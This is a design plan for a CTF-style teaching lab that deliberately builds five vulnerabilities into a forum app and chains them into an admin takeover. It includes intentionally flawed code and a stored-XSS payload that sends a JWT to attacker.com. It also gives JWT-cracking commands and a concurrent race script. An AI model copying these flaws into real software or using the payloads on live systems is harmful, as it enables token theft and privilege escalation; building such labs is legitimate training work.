# VulnForum — 5 Intentional Vulnerability Plan

## Context

VulnForum is an educational security lab. The goal is to embed 5 non-trivial, CTF-worthy vulnerabilities across the forum. Each requires adding a realistic new feature to the app so the vulnerability doesn't look contrived. The full kill chain is designed so vulns 1→2→4 chain into an admin takeover, vuln 3 provides an alternate path to the same outcome, and vuln 5 is standalone.

---

## Kill Chain Overview

```
Vuln 1 (Predictable Invite Token)
    → gain access to private thread
    → post XSS payload as a "member"

Vuln 2 (Stored XSS via Unsafe Markdown)
    → admin views thread → JWT stolen from localStorage
    → OR skip to Vuln 3 for a harder path

Vuln 3 (Weak JWT Secret in git)
    → crack HS256 key offline → forge Admin JWT directly

Both paths lead to:

Vuln 4 (Mass Assignment on Profile Update)
    → PUT /api/users/me with role:"Admin"
    → logout + re-login → Admin JWT
    → GET /api/admin/export → all users + bcrypt hashes

Standalone:
Vuln 5 (TOCTOU Race on Comment Reactions)
    → 50 concurrent requests → 50 downvotes from one account
    → manipulate moderation queue
```

---

## Vuln 1 — Predictable Invite Token → IDOR (Private Thread)

**Class:** CWE-330 (Weak PRNG) + CWE-639 (IDOR)  
**Difficulty:** Medium

### New feature
Shareable invite links for private threads. Author generates a link token; anyone with the token can self-join. Realistic — every forum has this.

### The flaw
Token = `MD5("{postId}{authorGuid}{DateTime.UtcNow:yyyyMMddHH}")[0..8]` — no secret key. All inputs are public:
- `postId` — visible in feed (feed shows all private posts with lock icon)
- `authorGuid` — leaked by `GET /api/users/{username}` → `UserProfileDto.Id`
- Creation hour — visible in `PostDto.CreatedAt` (restricted DTO still returns this)

Attacker computes the token locally, redeems it, gains full member access.

### Attack steps
1. Browse feed → collect private post IDs + `authorUsername`
2. `GET /api/users/{authorUsername}` → get author GUID
3. `GET /api/posts/{id}` → get `createdAt` → round to hour
4. Compute `MD5("{postId}{authorGuid}{yyyyMMddHH}")[0..8]` in Python
5. `POST /api/invites/{token}/redeem` → added as member
6. `GET /api/posts/{id}` → full content visible

### Files
**New:**
- `Domain/Entities/InviteLink.cs`
- `Infrastructure/Data/Configurations/InviteLinkConfiguration.cs`
- `Domain/Interfaces/Repositories/IInviteLinkRepository.cs`
- `Infrastructure/Repositories/InviteLinkRepository.cs`
- `Application/Interfaces/Services/IInviteLinkService.cs`
- `Application/Services/InviteLinkService.cs` ← flaw lives here
- `Endpoints/InviteLinkEndpoints.cs`

**Modified:**
- `Program.cs` — register DI + map endpoints
- `NexusForum-Client/.../post-detail.component.ts` — "Generate Invite Link" button for authors

---

## Vuln 2 — Stored XSS via Unsafe Markdown Rendering

**Class:** CWE-79 (Second-Order Stored XSS)  
**Difficulty:** Easy-Medium

### New feature
Markdown rendering in post content and comments using the `marked` npm package. Realistic for a dev forum.

### The flaw
Angular pipe uses `DomSanitizer.bypassSecurityTrustHtml()` — disables Angular's DOM sanitizer entirely. `marked` passes raw HTML blocks through unchanged. Backend stores content verbatim (no server-side sanitization).

```typescript
// markdown.pipe.ts
transform(value: string): SafeHtml {
  const html = marked.parse(value, { async: false }) as string;
  return this.sanitizer.bypassSecurityTrustHtml(html); // ← flaw
}
```

Payload stored in any comment/post:
```
<img src="x" onerror="fetch('https://attacker.com/?t='+localStorage.getItem('nexus_user'))">
```

Fires when any user (especially admin) views the post. Exfiltrates full JWT from `localStorage`.

### Attack steps
1. (Optional) Use Vuln 1 to post into a private thread the admin frequents
2. `POST /api/posts/{id}/comments` with XSS payload in `content`
3. Admin views post → payload fires → JWT exfiltrated
4. Replay stolen JWT as admin

### Files
**New:**
- `NexusForum-Client/src/app/shared/markdown/markdown.pipe.ts` ← flaw lives here

**Modified:**
- `NexusForum-Client/package.json` — add `marked`
- `NexusForum-Client/.../post-detail.component.ts` — switch `{{ content }}` → `[innerHTML]="content | markdown"`
- `NexusForum-Client/.../post-form.component.ts` — add markdown preview (also uses unsafe pipe)

---

## Vuln 3 — Weak JWT Secret Committed to Git → Token Forgery

**Class:** CWE-347 (Improper Verification of Cryptographic Signature) + CWE-798 (Hardcoded Credentials)  
**Difficulty:** Medium

### New feature
Admin data export endpoint `GET /api/admin/export` — dumps all user records. Realistic admin utility. Intentionally returns raw `User` entity (leaks `PasswordHash`).

### The flaw
`appsettings.Development.json` (committed to git) sets:
```json
"Jwt": { "Key": "nexusforum-dev-secret-key-change-in-production" }
```
This phrase cracks instantly with `hashcat -m 16500` against common wordlists. With the key, attacker forges a JWT with `role=Admin` for any user ID (GUIDs leaked by `GET /api/users/{username}`).

Secondary flaw: export endpoint returns raw `User` entity including `PasswordHash` — enables offline bcrypt cracking.

### Attack steps
1. Clone repo → find key in `appsettings.Development.json`
2. OR steal JWT via Vuln 2 → confirm `alg=HS256` + issuer/audience strings
3. `hashcat -a 0 -m 16500 <jwt> wordlist.txt` → key cracked
4. `GET /api/users/admin` → get admin GUID
5. Forge JWT: `sub=<adminGuid>`, `role=Admin`, `unique_name=admin`, fresh `jti`, far `exp`
6. `GET /api/admin/export` → all users + bcrypt hashes
7. Offline crack hashes → credential reuse on other services

### Files
**New:**
- `Endpoints/AdminEndpoints.cs` ← export endpoint, returns raw entity (intentional)

**Modified:**
- `appsettings.Development.json` — set weak key as the intentional flaw
- `Program.cs` — map admin endpoints

---

## Vuln 4 — Mass Assignment on Profile Update → Privilege Escalation

**Class:** CWE-915 (Mass Assignment / BOPLA)  
**Difficulty:** Medium-Hard

### New feature
`PUT /api/users/me` — lets users update display name, bio, avatar URL. Missing from current codebase.

### The flaw
`UpdateProfileRequest` DTO includes a `Role` field ("for admin use"). No authorization check before applying it. Any authenticated user can set their own role.

```csharp
// UpdateProfileRequest.cs
public record UpdateProfileRequest(string Username, string Bio, string AvatarUrl, string? Role);

// UserService.UpdateProfileAsync
if (request.Role is not null && Enum.TryParse<UserRole>(request.Role, out var role))
    user.Role = role;  // ← no guard, any user can write this
```

**Key nuance:** privilege escalation is deferred — current JWT still says `Member`. Must logout + re-login to get new Admin JWT. Students must understand JWT claim lifecycle.

### Attack steps
1. `PUT /api/users/me` → `{"username":"x","bio":"","avatarUrl":"","role":"Admin"}`
2. `POST /api/auth/logout`
3. `POST /api/auth/login` → new JWT contains `role=Admin`
4. Access `/api/admin/export`, delete any post, or bypass all ownership checks

### Files
**New:**
- `Application/DTOs/Users/UpdateProfileRequest.cs` ← `Role` field is the flaw
- EF migration for `Bio` + `AvatarUrl` columns on `Users`

**Modified:**
- `Domain/Entities/User.cs` — add `Bio`, `AvatarUrl`
- `Infrastructure/Data/Configurations/UserConfiguration.cs`
- `Application/Interfaces/Services/IUserService.cs` — add `UpdateProfileAsync`
- `Application/Services/UserService.cs` — implement with flaw
- `Endpoints/UserEndpoints.cs` — add `PUT /api/users/me`
- `Application/DTOs/Users/UserProfileDto.cs` — add `Bio`, `AvatarUrl` (NOT `Role` — hides the effect)
- `NexusForum-Client/.../user-profile.component.ts` — edit profile form (no Role field in UI)

---

## Vuln 5 — TOCTOU Race Condition on Comment Reactions

**Class:** CWE-362 (Race Condition / TOCTOU)  
**Difficulty:** Hard

### New feature
Comment reactions (👍/👎). One reaction per user per comment. Moderators use downvote counts to triage content. Realistic engagement feature.

### The flaw
Application-layer duplicate check with no DB-level unique constraint on `(CommentId, UserId)`. Concurrent requests all pass the check before any commits.

```csharp
// ReactionService.ReactAsync — TOCTOU
var existing = await _reactionRepo.GetAsync(commentId, userId); // CHECK
if (existing is not null) return Failure("Already reacted.", 409);
// ← race window — 50 concurrent requests all reach here simultaneously
await _reactionRepo.AddAsync(new CommentReaction { ... });      // ACT
await _reactionRepo.SaveChangesAsync();
```

`CommentReactionConfiguration` intentionally omits:
```csharp
// builder.HasIndex(r => new { r.CommentId, r.UserId }).IsUnique(); ← NOT added
```

### Attack steps
1. Pick a target comment ID
2. Send 50 concurrent POST requests:
```python
import asyncio, aiohttp
async def react(s, cid, tok):
    async with s.post(f'.../api/comments/{cid}/react',
        json={'reactionType':'down'}, headers={'Authorization':f'Bearer {tok}'}) as r:
        return await r.status
async def main():
    async with aiohttp.ClientSession() as s:
        await asyncio.gather(*[react(s, 42, TOKEN) for _ in range(50)])
asyncio.run(main())
```
3. Comment now shows 35-50 downvotes from one account
4. Moderation queue auto-surfaces it for deletion

### Files
**New:**
- `Domain/Entities/CommentReaction.cs` — no unique index attr
- `Infrastructure/Data/Configurations/CommentReactionConfiguration.cs` ← unique index intentionally omitted
- `Domain/Interfaces/Repositories/ICommentReactionRepository.cs`
- `Infrastructure/Repositories/CommentReactionRepository.cs`
- `Application/DTOs/Comments/ReactionCountDto.cs`
- `Application/Interfaces/Services/IReactionService.cs`
- `Application/Services/ReactionService.cs` ← TOCTOU flaw lives here
- EF migration for `CommentReactions` table

**Modified:**
- `Endpoints/CommentEndpoints.cs` — add `POST /api/comments/{id}/react`
- `Application/DTOs/Comments/CommentDto.cs` — add `UpCount`, `DownCount`
- `NexusForum-Client/.../post-detail.component.ts` — thumbs up/down buttons per comment
- `Program.cs` — register new DI

---

## Implementation Order

1. Vuln 3 (smallest — just a weak key + one new endpoint, no new entity)
2. Vuln 4 (profile update — adds Bio/AvatarUrl, one migration)
3. Vuln 1 (invite link — new entity + token generation logic)
4. Vuln 5 (reactions — new entity, TOCTOU service)
5. Vuln 2 (markdown pipe — frontend only, no backend changes)

---

## Verification

- **Vuln 1:** Python script computing MD5 token for a known private post → `POST /invites/{token}/redeem` → `GET /posts/{id}` returns full content
- **Vuln 2:** Post `<img src=x onerror=alert(1)>` in a comment → visit post → alert fires
- **Vuln 3:** `jwt_tool -C -d wordlist.txt <token>` cracks key in <1s; forge Admin JWT → `/api/admin/export` returns 200
- **Vuln 4:** `PUT /api/users/me` with `role:Admin` → logout → login → JWT payload shows `role:Admin`
- **Vuln 5:** 50 concurrent reaction requests → DB has >1 row for same `(CommentId, UserId)`
